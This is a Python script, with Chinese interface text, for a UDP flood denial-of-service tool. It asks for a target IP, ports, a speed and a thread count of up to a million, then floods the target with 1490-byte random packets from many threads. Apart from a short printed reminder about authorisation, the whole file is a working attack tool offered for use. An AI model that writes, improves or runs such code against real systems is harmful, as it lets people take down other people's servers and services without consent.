import time
import socket
import random
import threading
from datetime import datetime
import re

title = """
          ______ _____ _____ 
          |  _  \  _  /  ___|
          | | | | | | \ `--. 
          | | | | | | |`--. \ 
          | |/ /\ \_/ /\__/ /
          |___/  \___/\____/ 
"""

def is_valid_ip(ip):
    """验证IPv4或IPv6地址是否有效"""
    # IPv4验证
    ipv4_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ipv4_pattern.match(ip):
        parts = ip.split('.')
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    
    # IPv6验证
    ipv6_pattern = re.compile(
        r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|'
        r'^::([0-9a-fA-F]{1,4}:){0,6}[0-9a-fA-F]{1,4}$|'
        r'^([0-9a-fA-F]{1,4}:){1,6}::([0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}$'
    )
    return bool(ipv6_pattern.match(ip))

class Attack:
    def __init__(self):
        now = datetime.now()
        self.hour = now.hour
        self.minute = now.minute
        self.day = now.day
        self.month = now.month
        self.year = now.year
        try:
            while True:
                self.ip = input("请输入目标IP: ").strip()
                if is_valid_ip(self.ip):
                    break
                print("错误: 无效的IP地址格式，请输入有效的IPv4或IPv6地址")
            
            ports_input = input("输入攻击端口(多个端口用逗号分隔): ").strip()
            if not ports_input:
                raise ValueError("至少需要指定一个端口")
            self.ports = []
            for p in ports_input.split(','):
                port = p.strip()
                if not port.isdigit() or not (0 < int(port) <= 65535):
                    raise ValueError(f"无效端口号: {port}")
                self.ports.append(int(port))
            
            self.speed = int(input("攻击速度(1~1000): "))
            if not (1 <= self.speed <= 1000):
                raise ValueError("攻击速度必须在1~1000之间")
            
            self.threads = int(input("线程数量(建议1 ~ 1000000): "))
            if not (1 <= self.threads <= 1000000):
                raise ValueError("线程数量必须在1 ~ 1000000之间")
            
            self.counter = 0
            self.lock = threading.Lock()
            self.running = True
            self.sockets = []
            self.family = socket.AF_INET6 if ':' in self.ip else socket.AF_INET
        except ValueError as e:
            print(f"\n输入错误: {e}")
            raise
        except Exception as e:
            print(f"\n初始化错误: {e}")
            raise
    
    def attack_port(self, port):
        try:
            sock = socket.socket(self.family, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sockets.append(sock)
            bytes = random._urandom(1490)
            while self.running:
                try:
                    sock.sendto(bytes, (self.ip, port))
                    with self.lock:
                        self.counter += 1
                        if self.counter % 100 == 0:
                            ports_str = ','.join(map(str, self.ports))
                            print(f"已发送 {self.counter} 个 UDP 数据包", end="\r")
                    time.sleep((1000 - self.speed) / 2000)
                except socket.error as e:
                    print(f"\n网络错误: {e}")
                    break
                except Exception as e:
                    print(f"\n未知错误: {e}")
                    break
        except Exception as e:
            print(f"\n创建socket错误: {e}")
    
    def start(self):
        print(f"\n攻击信息\n{'-' * 50}\n目标IP: {self.ip}\nIP类型: {'IPv6' if ':' in self.ip else 'IPv4'}\n攻击速度: {self.speed}\n攻击端口: {self.ports}\n线程数量: {self.threads}\n{'-' * 50}")
        try:
            threads_per_port = max(1, self.threads // len(self.ports))
            for port in self.ports:
                for _ in range(threads_per_port):
                    thread = threading.Thread(target=self.attack_port, args=(port,))
                    thread.daemon = True
                    thread.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("\n正在停止攻击...")
                time.sleep(1)
        finally:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"\n攻击已停止")
            print(f"总共发送了 {self.counter} 个数据包")

def DOS_thread_dos_main():
    print(title)
    print("[安全警告]")
    print("-" * 40)
    print("1. 请确保您有目标网站的访问授权")
    print("2. 高频请求可能导致IP被封禁")
    print("3. 按 Ctrl+C 停止攻击")
    print("4. 支持 IPv4 和 IPv6 地址")
    print("-" * 40)
    try:
        attack = Attack()
        attack.start()
    except Exception as e:
        print(f"\n程序异常: {e}")
    finally:
        print("\n程序退出")

if __name__ == "__main__":
    DOS_thread_dos_main()